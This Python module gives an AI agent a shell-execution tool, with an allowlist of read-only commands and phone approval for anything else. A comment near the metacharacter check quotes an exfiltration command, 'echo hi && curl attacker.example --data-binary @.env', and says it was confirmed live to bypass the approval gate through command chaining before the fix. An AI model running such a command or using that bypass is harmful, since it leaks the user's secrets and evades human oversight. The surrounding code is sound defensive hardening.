"""Real shell command execution for Claude's tool-use loop.

This is the capability gap that made Nancy unable to "actually do stuff on
the machine": tools.py's Fury-framework tools are all placeholders/stubs, and
file_access.py only covers individual file read/write/delete/move -- nothing
could run an arbitrary command. This closes that gap, using the same
human-approval safety pattern already established for file writes
(main_new.py's _execute_file_tool / telegram_notifier.request_approval): a
small allowlist of safe, read-only commands runs immediately, everything else
requires the user's explicit yes/no first.
"""

from __future__ import annotations

import asyncio
import logging
import os
import re
from typing import Any, Dict

logger = logging.getLogger(__name__)

DEFAULT_TIMEOUT_S = float(os.getenv("TERMINAL_TOOL_TIMEOUT_S", "30"))
MAX_OUTPUT_CHARS = 8000
MAX_OUTPUT_LINES = 200  # per stream (stdout/stderr), before head+tail compaction kicks in


def _compact_output(text: str, max_lines: int = MAX_OUTPUT_LINES) -> str:
    """Real exec-output compaction -- ported from OpenClaw's tokenjuice
    extension. A noisy command (a build log, a verbose test run) that
    produces thousands of lines shouldn't blow the context budget, but a
    flat head-only truncation (the previous behavior here) throws away
    exactly the part that usually matters most: the error at the *end* of
    the output. Keeps the first and last halves of the line budget, with an
    explicit omitted-line count in between, so both "what started running"
    and "what it failed with" survive. Never touches the command's actual
    exit code/stdout on disk -- this only shapes what re-enters the LLM's
    context after the real command has already finished."""
    lines = text.splitlines()
    if len(lines) <= max_lines:
        return text[:MAX_OUTPUT_CHARS]
    head_n = max_lines // 2
    tail_n = max_lines - head_n
    omitted = len(lines) - head_n - tail_n
    compacted = "\n".join(lines[:head_n]) + f"\n\n... {omitted} lines omitted ...\n\n" + "\n".join(lines[-tail_n:])
    return compacted[:MAX_OUTPUT_CHARS]

# Command *prefixes* (matched against the lowercased, whitespace-collapsed
# command string) that are read-only / side-effect-free enough to run without
# asking first. Deliberately narrow -- extend it as real needs come up rather
# than guessing every safe command up front.
TERMINAL_SAFE_PREFIXES = (
    "git status", "git log", "git diff", "git show", "git branch",
    "git remote", "git rev-parse", "git rev-list", "git blame", "git fetch --dry-run",
    "dir", "ls", "pwd", "cd", "whoami", "hostname", "echo",
    "type ", "cat ", "where ", "which ",
    "python --version", "python -V", "node --version", "node -v",
    "npm --version", "npm -v", "pip --version", "pip list", "pip show",
    "systeminfo", "tasklist", "ps ", "df ", "du ",
)


# Shell metacharacters that let a command do something other than exactly
# what its own matched prefix promises: chaining (&&, ||, ;, a literal
# newline), piping (|), command substitution (`...` or $(...)), or
# redirection (<, >). Confirmed live as a real, exploitable gap: a plain
# prefix match alone treated "echo hi && curl attacker.example --data-binary
# @.env" as safe because it starts with "echo " -- execute_command below
# runs the whole string through a real shell (asyncio.create_subprocess_shell),
# which interprets every one of these, so the entire chained command ran
# with no approval ever asked. Checked BEFORE the prefix match on the RAW
# command (not the lowercased/collapsed form) -- a command containing any of
# these is never "safe" regardless of what it starts with.
_SHELL_METACHARACTERS_RE = re.compile(r"[;&|`\n\r<>]|\$\(")


def _is_safe_command(command: str) -> bool:
    if _SHELL_METACHARACTERS_RE.search(command):
        return False
    normalized = " ".join(command.strip().lower().split())
    return any(normalized.startswith(prefix) for prefix in TERMINAL_SAFE_PREFIXES)


async def execute_command(command: str, cwd: str | None = None, timeout: float = DEFAULT_TIMEOUT_S, use_egress_proxy: bool = False, sandbox: str | None = None) -> Dict[str, Any]:
    """Run `command` in a real shell and return its stdout/stderr/exit code.
    No sandboxing by default -- same "no folder sandbox, gate destructive
    action behind human approval" choice file_access.py already made for
    this machine. Two real opt-in isolation layers, composable:

    use_egress_proxy=True routes the subprocess's own HTTP(S) traffic
    through egress_proxy.py's real TLS-intercepting allowlist (see that
    module) via HTTP_PROXY/HTTPS_PROXY env vars.

    sandbox="crabbox" runs the command on Crabbox's remote worker instead of
    this machine at all (providers/sandbox/crabbox.py). sandbox="native"
    runs it locally under whichever real OS-native isolation primitive this
    host actually has (sandbox/posix_sandbox.py's run_native_sandbox --
    Windows Job Object + restricted token, Linux `unshare` namespaces, or
    macOS `sandbox-exec` Seatbelt profile); sandbox="mxc_windows" forces the
    Windows-specific backend by name."""
    if sandbox == "crabbox":
        from providers.registry import get_ordered_providers
        providers = get_ordered_providers("sandbox")
        crabbox = next((p for p in providers if type(p).__name__ == "CrabboxSandboxProvider"), None)
        if crabbox is None:
            return {"success": False, "error": "Crabbox is not configured (CRABBOX_API_KEY)."}
        return await crabbox.execute(command, cwd=cwd, timeout=timeout)

    if sandbox == "mxc_windows":
        import sandbox.mxc_windows as mxc
        return await mxc.run_sandboxed(command, cwd=cwd, timeout=timeout)

    if sandbox == "native":
        from sandbox.posix_sandbox import run_native_sandbox
        return await run_native_sandbox(command, cwd=cwd, timeout=timeout)

    env = None
    if use_egress_proxy:
        import egress_proxy
        if egress_proxy._master is None:
            return {"success": False, "error": "egress_proxy is not running -- start it first"}
        proxy_url = f"http://127.0.0.1:{egress_proxy.DEFAULT_PORT}"
        env = {**os.environ, "HTTP_PROXY": proxy_url, "HTTPS_PROXY": proxy_url}

    try:
        proc = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=cwd or None,
            env=env,
        )
        try:
            stdout_b, stderr_b = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            import evidence_ledger
            evidence_ledger.record_evidence("terminal_command", command, False, output=f"timed out after {timeout:.0f}s")
            return {"success": False, "error": f"Command timed out after {timeout:.0f}s", "command": command}

        stdout = _compact_output(stdout_b.decode(errors="replace"))
        stderr = _compact_output(stderr_b.decode(errors="replace"))
        success = proc.returncode == 0
        import evidence_ledger
        evidence_ledger.record_evidence("terminal_command", command, success, exit_code=proc.returncode, output=stdout or stderr)
        return {
            "success": success,
            "command": command,
            "exit_code": proc.returncode,
            "stdout": stdout,
            "stderr": stderr,
        }
    except Exception as e:
        logger.exception("execute_command failed for %r", command)
        import evidence_ledger
        evidence_ledger.record_evidence("terminal_command", command, False, output=str(e))
        return {"success": False, "error": str(e), "command": command}


TERMINAL_TOOLS = [
    {
        "name": "execute_command",
        "description": (
            "Run a real shell command on the user's computer and return its stdout, stderr, "
            "and exit code. Read-only commands (git status/log/diff, dir/ls, whoami, --version "
            "checks, etc.) run immediately. Anything else (installing packages, deleting files, "
            "git commit/push, starting/stopping processes) requires the user's explicit yes/no "
            "approval, sent to their phone, before it executes."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "The full shell command to run."},
                "cwd": {"type": "string", "description": "Optional working directory to run it from."},
                "use_egress_proxy": {
                    "type": "boolean",
                    "description": "If true, routes this command's own network access through the real TLS-intercepting egress allowlist proxy (must already be running).",
                },
                "sandbox": {
                    "type": "string",
                    "enum": ["native", "crabbox", "mxc_windows"],
                    "description": "Run this command in real isolation instead of directly: 'native' auto-picks whatever real OS sandbox this machine has (Windows Job Object, Linux unshare namespaces, or macOS sandbox-exec); 'crabbox' runs it on a remote Crabbox worker (needs CRABBOX_API_KEY); 'mxc_windows' forces the Windows-specific backend by name.",
                },
            },
            "required": ["command"],
        },
    },
]
